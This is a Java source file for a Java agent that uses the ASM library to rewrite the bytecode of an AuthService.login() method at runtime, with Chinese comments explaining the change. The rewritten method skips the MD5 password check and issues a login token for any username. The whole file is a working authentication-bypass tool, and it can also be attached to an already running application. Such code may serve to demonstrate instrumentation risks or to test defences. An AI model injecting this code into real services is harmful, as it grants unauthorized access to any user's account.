package com.geek.agent;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

import org.objectweb.asm.*;

/**
 * Java Agent: 在运行时修改 AuthService.login() 方法的字节码，
 * 使其无论输入什么密码都返回登录成功。
 *
 * 原始逻辑: 比对 MD5(password) 与存储的哈希值
 * 修改后:   忽略密码校验，直接为任意用户名生成 token
 */
public class InjectAgent {

    private static final String TARGET_CLASS = "com/geek/auth/service/AuthService";

    public static void premain(String args, Instrumentation inst) {
        registerTransformer(inst);
    }

    public static void agentmain(String args, Instrumentation inst) {
        registerTransformer(inst);
    }

    private static void registerTransformer(Instrumentation inst) {
        System.out.println("[InjectAgent] Registering bytecode transformer...");

        inst.addTransformer(new ClassFileTransformer() {
            @Override
            public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                                    ProtectionDomain protectionDomain, byte[] classfileBuffer) {
                if (!TARGET_CLASS.equals(className)) return null;

                System.out.println("[InjectAgent] Found target class: " + className);
                System.out.println("[InjectAgent] Patching login() method to bypass password check...");

                ClassReader cr = new ClassReader(classfileBuffer);
                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS);

                ClassVisitor cv = new ClassVisitor(Opcodes.ASM9, cw) {
                    @Override
                    public MethodVisitor visitMethod(int access, String name, String descriptor,
                                                     String signature, String[] exceptions) {
                        MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                        if ("login".equals(name)
                                && "(Ljava/lang/String;Ljava/lang/String;)Lcom/geek/auth/model/LoginResult;".equals(descriptor)) {
                            System.out.println("[InjectAgent] Transforming login(Ljava/lang/String;Ljava/lang/String;)LoginResult");
                            return new LoginMethodPatcher(mv);
                        }
                        return mv;
                    }
                };

                cr.accept(cv, 0);

                System.out.println("[InjectAgent] Patch applied! Any password will now be accepted.");
                return cw.toByteArray();
            }
        }, true); // canRetransform = true

        // 对于已加载的类，触发 retransform
        for (Class<?> clazz : inst.getAllLoadedClasses()) {
            if (inst.isModifiableClass(clazz) && clazz.getName().replace('.', '/').equals(TARGET_CLASS)) {
                try {
                    inst.retransformClasses(clazz);
                    System.out.println("[InjectAgent] Retransformed already-loaded class: " + clazz.getName());
                } catch (Exception e) {
                    System.out.println("[InjectAgent] Retransform failed: " + e.getMessage());
                }
            }
        }
    }

    /**
     * 修改 login 方法: 清空原方法体，替换为直接生成 token 并返回成功的逻辑。
     *
     * 等价于:
     *   public LoginResult login(String username, String password) {
     *       String token = tokenService.createToken(username);
     *       return LoginResult.ok(token);
     *   }
     */
    static class LoginMethodPatcher extends MethodVisitor {

        LoginMethodPatcher(MethodVisitor mv) {
            super(Opcodes.ASM9, mv);
        }

        @Override
        public void visitCode() {
            mv.visitCode();

            // this.tokenService.createToken(username)
            mv.visitVarInsn(Opcodes.ALOAD, 0);                    // this
            mv.visitFieldInsn(Opcodes.GETFIELD,
                    "com/geek/auth/service/AuthService",
                    "tokenService",
                    "Lcom/geek/auth/service/TokenService;");
            mv.visitVarInsn(Opcodes.ALOAD, 1);                    // username (arg0)
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL,
                    "com/geek/auth/service/TokenService",
                    "createToken",
                    "(Ljava/lang/String;)Ljava/lang/String;",
                    false);

            // store token in local var
            mv.visitVarInsn(Opcodes.ASTORE, 3);

            // LoginResult.ok(token)
            mv.visitVarInsn(Opcodes.ALOAD, 3);                    // token
            mv.visitMethodInsn(Opcodes.INVOKESTATIC,
                    "com/geek/auth/model/LoginResult",
                    "ok",
                    "(Ljava/lang/String;)Lcom/geek/auth/model/LoginResult;",
                    false);

            // return the LoginResult
            mv.visitInsn(Opcodes.ARETURN);

            mv.visitMaxs(2, 4);
            mv.visitEnd();
        }

        // 跳过原始方法的所有指令
        @Override public void visitInsn(int opcode) {}
        @Override public void visitIntInsn(int opcode, int operand) {}
        @Override public void visitVarInsn(int opcode, int var) {}
        @Override public void visitTypeInsn(int opcode, String type) {}
        @Override public void visitFieldInsn(int opcode, String owner, String name, String desc) {}
        @Override public void visitMethodInsn(int opcode, String owner, String name, String desc, boolean itf) {}
        @Override public void visitJumpInsn(int opcode, Label label) {}
        @Override public void visitLdcInsn(Object value) {}
        @Override public void visitIincInsn(int var, int increment) {}
        @Override public void visitTableSwitchInsn(int min, int max, Label dflt, Label... labels) {}
        @Override public void visitLookupSwitchInsn(Label dflt, int[] keys, Label[] labels) {}
        @Override public void visitMultiANewArrayInsn(String desc, int dims) {}
        @Override public void visitLineNumber(int line, Label start) {}
        @Override public void visitLocalVariable(String name, String desc, String signature, Label start, Label end, int index) {}
        @Override public void visitMaxs(int maxStack, int maxLocals) {}
    }
}
